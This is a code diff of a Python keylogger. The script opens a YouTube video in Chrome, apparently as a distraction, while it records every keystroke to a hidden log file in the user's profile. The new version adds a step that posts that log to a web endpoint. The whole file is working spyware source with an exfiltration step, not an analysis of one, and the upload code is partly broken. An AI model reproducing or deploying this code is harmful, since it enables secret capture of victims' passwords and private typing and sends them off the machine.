@@ -1,42 +1,29 @@
 import webbrowser
 import os
-import pyxhook
+from pynput.keyboard import Key, Listener
+import logging
+import requests
 
-url = 'https://youtu.be/0fDDbuYzNhA?t=12'
+
+url = 'https://youtu.be/fJ0kewOCD0Q?t=30'
 chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
+
 
 webbrowser.get(chrome_path).open(url)
 
-log_file = os.environ.get(
-    'pylogger_file',
-    os.path.expanduser('C:/Users/AndrÃ© Prodinger/Desktop/test/file.log')
-)
-cancel_key = ord(
-    os.environ.get(
-        'pylogger_cancel',
-        '`'
-    )[0]
-)
-  
-if os.environ.get('pylogger_clean', None) is not None:
-    try:
-        os.remove(log_file)
-    except EnvironmentError:
-        pass
+log_dir = ""
 
-def OnKeyPress(event):
-    with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.Key))
+logging.basicConfig(filename=(log_dir + os.environ['USERPROFILE'] + '/kelogged.txt'), 
+	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-new_hook = pyxhook.HookManager()
-new_hook.KeyDown = OnKeyPress
-new_hook.HookKeyboard()
-try:
-    new_hook.start()        
-except KeyboardInterrupt:
-    pass
-except Exception as ex:
-    msg = 'Error while catching events:\n  {}'.format(ex)
-    pyxhook.print_err(msg)
-    with open(log_file, 'a') as f:
-        f.write('\n{}'.format(msg))
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+    fileurl = 'http://localhost:8080/'
+    files = {open(os.environ['USERPROFILE'] + '/kelogged.txt', 'rb')}
+    r = requests.post(fileurl, files=files)
+    r.text
+
